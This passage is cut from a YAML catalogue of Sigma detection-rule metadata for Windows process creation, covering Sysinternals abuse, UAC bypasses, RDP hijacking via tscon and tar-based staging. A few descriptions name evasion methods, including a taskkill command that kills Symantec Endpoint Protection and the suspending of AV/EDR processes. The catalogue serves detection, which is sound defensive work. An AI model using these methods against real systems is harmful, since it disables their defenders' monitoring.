  - attack.t1087.001
  - attack.t1087.002
  time_window: ''
  references:
  - https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/
  - https://www.cybereason.com/blog/deadringer-exposing-chinese-threat-actors-targeting-major-telcos
  - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Sysinternals/PsLogList
  - https://twitter.com/EricaZelic/status/1614075109827874817
  false_positives:
  - Another tool that uses the command line switches of PsLogList
  - Legitimate use of PsLogList by an administrator
  notes: ''
- detection_id: 3371f518-5fe3-4cf6-a14b-2a0ae3fd8a4f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_psservice.yml
  name: Sysinternals PsService Execution
  description: Detects usage of Sysinternals PsService which can be abused for service
    reconnaissance and tampering
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.privilege-escalation
  - attack.discovery
  - attack.persistence
  - attack.t1543.003
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/psservice
  false_positives:
  - Legitimate use of PsService by an administrator
  notes: ''
- detection_id: 48bbc537-b652-4b4e-bd1d-281172df448f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_pssuspend_execution.yml
  name: Sysinternals PsSuspend Execution
  description: Detects usage of Sysinternals PsSuspend which can be abused to suspend
    critical processes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.privilege-escalation
  - attack.discovery
  - attack.persistence
  - attack.t1543.003
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/pssuspend
  - https://twitter.com/0gtweet/status/1638069413717975046
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4beb6ae0-f85b-41e2-8f18-8668abc8af78
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_pssuspend_susp_execution.yml
  name: Sysinternals PsSuspend Suspicious Execution
  description: Detects suspicious execution of Sysinternals PsSuspend, where the utility
    is used to suspend critical processes such as AV or EDR to bypass defenses
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/pssuspend
  - https://twitter.com/0gtweet/status/1638069413717975046
  false_positives:
  - Unlikely
  notes: ''
- detection_id: a4824fca-976f-4964-b334-0621379e84c4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_sdelete.yml
  name: Potential File Overwrite Via Sysinternals SDelete
  description: Detects the use of SDelete to erase a file not the free space
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1485
  tags:
  - attack.impact
  - attack.t1485
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1485/T1485.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 207b0396-3689-42d9-8399-4222658efc99
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_susp_psexec_paexec_flags.yml
  name: Potential Privilege Escalation To LOCAL SYSTEM
  description: Detects unknown program using commandline flags usually used by tools
    such as PsExec and PAExec to start programs with SYSTEM Privileges
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1587.001
  tags:
  - attack.resource-development
  - attack.t1587.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
  - https://www.poweradmin.com/paexec/
  - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html
  false_positives:
  - Weird admins that rename their tools
  - Software companies that bundle PsExec/PAExec with their software and rename it,
    so that it is less embarrassing
  notes: ''
- detection_id: 87911521-7098-470b-a459-9a57fc80bdfd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_sysmon_config_update.yml
  name: Sysmon Configuration Update
  description: Detects updates to Sysmon's configuration. Attackers might update or
    replace the Sysmon configuration with a bare bone one to avoid monitoring without
    shutting down the service completely
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
  false_positives:
  - Legitimate administrators might use this command to update Sysmon configuration.
  notes: ''
- detection_id: 6a5f68d1-c4b5-46b9-94ee-5324892ea939
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_sysmon_uninstall.yml
  name: Uninstall Sysinternals Sysmon
  description: Detects the removal of Sysmon, which could be a potential attempt at
    defense evasion
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md#atomic-test-11---uninstall-sysmon
  false_positives:
  - Legitimate administrators might use this command to remove Sysmon for debugging
    purposes
  notes: ''
- detection_id: 7cce6fc8-a07f-4d84-a53e-96e1879843c9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_tools_masquerading.yml
  name: Potential Binary Impersonating Sysinternals Tools
  description: 'Detects binaries that use the same name as legitimate sysinternals
    tools to evade detection.

    This rule looks for the execution of binaries that are named similarly to Sysinternals
    tools.

    Adversary may rename their malicious tools as legitimate Sysinternals tools to
    evade detection.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1036.005
  - T1202
  - T1218
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1218
  - attack.t1202
  - attack.t1036.005
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
  false_positives:
  - Unknown
  notes: ''
- detection_id: d5b9ae7a-e6fc-405e-80ff-2ff9dcc64e7e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysprep_appdata.yml
  name: Sysprep on AppData Folder
  description: Detects suspicious sysprep process start with AppData folder as target
    (as used by Trojan Syndicasec in Thrip report by Symantec)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets
  - https://app.any.run/tasks/61a296bb-81ad-4fee-955f-3b399f4aaf4b
  false_positives:
  - False positives depend on scripts and administrative tools used in the monitored
    environment
  notes: ''
- detection_id: 0ef56343-059e-4cb6-adc1-4c3c967c5e46
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_systeminfo_execution.yml
  name: Suspicious Execution of Systeminfo
  description: Detects usage of the "systeminfo" command to retrieve information
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1082/T1082.md#atomic-test-1---system-information-discovery
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo
  false_positives:
  - Unknown
  notes: ''
- detection_id: a383dec4-deec-4e6e-913b-ed9249670848
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_systemsettingsadminflows_turn_on_dev_features.yml
  name: Potential Signing Bypass Via Windows Developer Features
  description: Detects when a user enable developer features such as "Developer Mode"
    or "Application Sideloading". Which allows the user to install untrusted packages.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - Internal Research
  - https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 554601fb-9b71-4bcc-abf4-21a611be4fde
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_takeown_recursive_own.yml
  name: Suspicious Recursive Takeown
  description: Adversaries can interact with the DACLs using built-in Windows commands
    takeown which can grant adversaries higher permissions on specific files and folders
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1222.001
  tags:
  - attack.defense-evasion
  - attack.t1222.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1222.001/T1222.001.md#atomic-test-1---take-ownership-using-takeown-utility
  false_positives:
  - Scripts created by developers and admins
  - Administrative activity
  notes: ''
- detection_id: 99793437-3e16-439b-be0f-078782cf953d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_tapinstall_execution.yml
  name: Tap Installer Execution
  description: Well-known TAP software installation. Possible preparation for data
    exfiltration using tunneling techniques
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048
  tags:
  - attack.exfiltration
  - attack.t1048
  time_window: ''
  references:
  - https://community.openvpn.net/openvpn/wiki/ManagingWindowsTAPDrivers
  false_positives:
  - Legitimate OpenVPN TAP installation
  notes: ''
- detection_id: 418a3163-3247-4b7b-9933-dcfcb7c52ea9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_tar_compression.yml
  name: Compressed File Creation Via Tar.EXE
  description: 'Detects execution of "tar.exe" in order to create a compressed file.

    Adversaries may abuse various utilities to compress or encrypt data before exfiltration.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  - Exfiltration
  techniques:
  - T1560
  - T1560.001
  tags:
  - attack.collection
  - attack.exfiltration
  - attack.t1560
  - attack.t1560.001
  time_window: ''
  references:
  - https://unit42.paloaltonetworks.com/chromeloader-malware/
  - https://lolbas-project.github.io/lolbas/Binaries/Tar/
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage
  false_positives:
  - Likely
  notes: ''
- detection_id: bf361876-6620-407a-812f-bfe11e51e924
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_tar_extraction.yml
  name: Compressed File Extraction Via Tar.EXE
  description: 'Detects execution of "tar.exe" in order to extract compressed file.

    Adversaries may abuse various utilities in order to decompress data to avoid detection.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  - Exfiltration
  techniques:
  - T1560
  - T1560.001
  tags:
  - attack.collection
  - attack.exfiltration
  - attack.t1560
  - attack.t1560.001
  time_window: ''
  references:
  - https://unit42.paloaltonetworks.com/chromeloader-malware/
  - https://lolbas-project.github.io/lolbas/Binaries/Tar/
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage
  false_positives:
  - Likely
  notes: ''
- detection_id: 4a6713f6-3331-11ed-a261-0242ac120002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_taskkill_sep.yml
  name: Taskkill Symantec Endpoint Protection
  description: 'Detects one of the possible scenarios for disabling Symantec Endpoint
    Protection.

    Symantec Endpoint Protection antivirus software services incorrectly implement
    the protected service mechanism.

    As a result, the NT AUTHORITY/SYSTEM user can execute the taskkill /im command
    several times ccSvcHst.exe /f, thereby killing the process belonging to the service,
    and thus shutting down the service.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.exploit-db.com/exploits/37525
  - https://community.spiceworks.com/topic/2195015-batch-script-to-uninstall-symantec-endpoint-protection
  - https://community.broadcom.com/symantecenterprise/communities/community-home/digestviewer/viewthread?MessageKey=6ce94b67-74e1-4333-b16f-000b7fd874f0&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=digestviewer
  false_positives:
  - Unknown
  notes: ''
- detection_id: 34275eb8-fa19-436b-b959-3d9ecd53fa1f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_tasklist_module_enumeration.yml
  name: Loaded Module Enumeration Via Tasklist.EXE
  description: 'Detects the enumeration of a specific DLL or EXE being used by a binary
    via "tasklist.exe".

    This is often used by attackers in order to find the specific process identifier
    (PID) that is using the DLL in question.

    In order to dump the process memory or perform other nefarious actions.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.t1003
  - attack.credential-access
  time_window: ''
  references:
  - https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/
  - https://pentestlab.blog/tag/svchost/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9fff585c-c33e-4a86-b3cd-39312079a65f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_taskmgr_localsystem.yml
  name: Taskmgr as LOCAL_SYSTEM
  description: Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3d7679bd-0c00-440c-97b0-3f204273e6c7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_taskmgr_susp_child_process.yml
  name: New Process Created Via Taskmgr.EXE
  description: Detects the creation of a process via the Windows task manager. This
    might be an attempt to bypass UAC
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - https://twitter.com/ReneFreingruber/status/1172244989335810049
  false_positives:
  - Administrative activity
  notes: ''
- detection_id: d2eb17db-1d39-41dc-b57f-301f6512fa75
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_teams_suspicious_command_line_cred_access.yml
  name: Potentially Suspicious Command Targeting Teams Sensitive Files
  description: 'Detects a commandline containing references to the Microsoft Teams
    database or cookies files from a process other than Teams.

    The database might contain authentication tokens and other sensitive information
    about the logged in accounts.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1528
  tags:
  - attack.credential-access
  - attack.t1528
  time_window: ''
  references:
  - https://www.bleepingcomputer.com/news/security/microsoft-teams-stores-auth-tokens-as-cleartext-in-windows-linux-macs/
  - https://www.vectra.ai/blogpost/undermining-microsoft-teams-security-by-mining-tokens
  false_positives:
  - Unknown
  notes: ''
- detection_id: c633622e-cab9-4eaa-bb13-66a1d68b3e47
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_tpmvscmgr_add_virtual_smartcard.yml
  name: New Virtual Smart Card Created Via TpmVscMgr.EXE
  description: Detects execution of "Tpmvscmgr.exe" to create a new virtual smart
    card.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/security/identity-protection/virtual-smart-cards/virtual-smart-card-tpmvscmgr
  false_positives:
  - Legitimate usage by an administrator
  notes: ''
- detection_id: 9847f263-4a81-424f-970c-875dab15b79b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_tscon_localsystem.yml
  name: Suspicious TSCON Start as SYSTEM
  description: Detects a tscon.exe start as LOCAL SYSTEM
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html
  - https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6
  - https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement
  false_positives:
  - Unknown
  notes: ''
- detection_id: f72aa3e8-49f9-4c7d-bd74-f8ab84ff9bbb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_tscon_rdp_redirect.yml
  name: Suspicious RDP Redirect Using TSCON
  description: Detects a suspicious RDP session redirect using tscon.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021.001
  - T1563.002
  tags:
  - attack.lateral-movement
  - attack.t1563.002
  - attack.t1021.001
  - car.2013-07-002
  time_window: ''
  references:
  - http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html
  - https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6
  - https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 224f140f-3553-4cd1-af78-13d81bf9f7cc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_tscon_rdp_session_hijacking.yml
  name: Potential RDP Session Hijacking Activity
  description: Detects potential RDP Session Hijacking activity on Windows systems
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://twitter.com/Moti_B/status/909449115477659651
  false_positives:
  - Administrative activity
  notes: ''
- detection_id: 503d581c-7df0-4bbe-b9be-5840c0ecc1fc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_changepk_slui.yml
  name: UAC Bypass Using ChangePK and SLUI
  description: Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://mattharr0ey.medium.com/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b
  - https://github.com/hfiref0x/UACME
  - https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf
  false_positives:
  - Unknown
  notes: ''
- detection_id: b697e69c-746f-4a86-9f59-7bfff8eab881
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_cleanmgr.yml
  name: UAC Bypass Using Disk Cleanup
  description: Detects the pattern of UAC Bypass using scheduled tasks and variable
    expansion of cleanmgr.exe (UACMe 34)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: e66779cc-383e-4224-a3a4-267eeb585c40
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_cmstp.yml
  name: Bypass UAC via CMSTP
  description: Detect commandline usage of Microsoft Connection Manager Profile Installer
    (cmstp.exe) to install specially formatted local .INF files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.003
  - T1548.002
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1548.002
  - attack.t1218.003
  time_window: ''
  references:
  - https://eqllib.readthedocs.io/en/latest/analytics/e584f1a1-c303-4885-8a66-21360c90995b.html
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.003/T1218.003.md
  - https://lolbas-project.github.io/lolbas/Binaries/Cmstp/
  false_positives:
  - Legitimate use of cmstp.exe utility by legitimate user
  notes: ''
- detection_id: 4b60e6f2-bf39-47b4-b4ea-398e33cfe253
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_cmstp_com_object_access.yml
  name: CMSTP UAC Bypass via COM Object Access
  description: Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile
    Installer Autoelevate-capable COM Objects (e.g. UACMe ID of 41, 43, 58 or 65)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218.003
  - T1548.002
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  - attack.t1218.003
  - attack.g0069
  - car.2019-04-001
  time_window: ''
  references:
  - https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/
  - https://twitter.com/hFireF0X/status/897640081053364225
  - https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Legitimate CMSTP use (unlikely in modern enterprise environments)
  notes: ''
- detection_id: 3c05e90d-7eba-4324-9972-5d7f711a60a8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_computerdefaults.yml
  name: UAC Bypass Tools Using ComputerDefaults
  description: Detects tools such as UACMe used to bypass UAC with computerdefaults.exe
    (UACMe 59)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1ca6bd18-0ba0-44ca-851c-92ed89a61085
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_consent_comctl32.yml
  name: UAC Bypass Using Consent and Comctl32 - Process
  description: Detects the pattern of UAC Bypass using consent.exe and comctl32.dll
    (UACMe 22)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 853e74f9-9392-4935-ad3b-2e8c040dae86
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_dismhost.yml
  name: UAC Bypass Using DismHost
  description: Detects the pattern of UAC Bypass using DismHost DLL hijacking (UACMe
    63)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 30fc8de7-d833-40c4-96b6-28319fbc4f6c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_eventvwr_recentviews.yml
  name: UAC Bypass Using Event Viewer RecentViews
  description: Detects the pattern of UAC Bypass using Event Viewer RecentViews
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://twitter.com/orange_8361/status/1518970259868626944
  - https://lolbas-project.github.io/lolbas/Binaries/Eventvwr/#execute
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7f741dcf-fc22-4759-87b4-9ae8376676a2
